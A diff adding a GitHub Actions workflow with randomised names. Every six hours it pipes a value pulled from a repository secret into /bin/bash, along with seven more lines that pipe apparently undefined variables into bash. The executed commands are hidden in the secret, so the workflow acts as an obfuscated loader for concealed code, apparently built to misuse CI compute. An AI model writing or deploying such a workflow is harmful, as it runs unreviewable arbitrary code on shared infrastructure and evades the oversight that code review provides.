@@ -1,0 +1,25 @@
+name: fanjiuzhou8190
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanjiuzhou8190
+        env:
+          vdn2173: ${{ secrets.vdn2173 }}
+        run: |
+          echo $vdn2173 | jq -r .ly005 | /bin/bash
+          echo $h9626 | jq -r .ei6 | /bin/bash
+          echo $v6740 | jq -r .ljp2 | /bin/bash
+          echo $z8 | jq -r .ydqop448 | /bin/bash
+          echo $avqt80958 | jq -r .nis96 | /bin/bash
+          echo $drzo8807 | jq -r .oonz1622 | /bin/bash
+          echo $w5 | jq -r .luscc14392 | /bin/bash
+          echo $viuv63 | jq -r .qr86 | /bin/bash
+
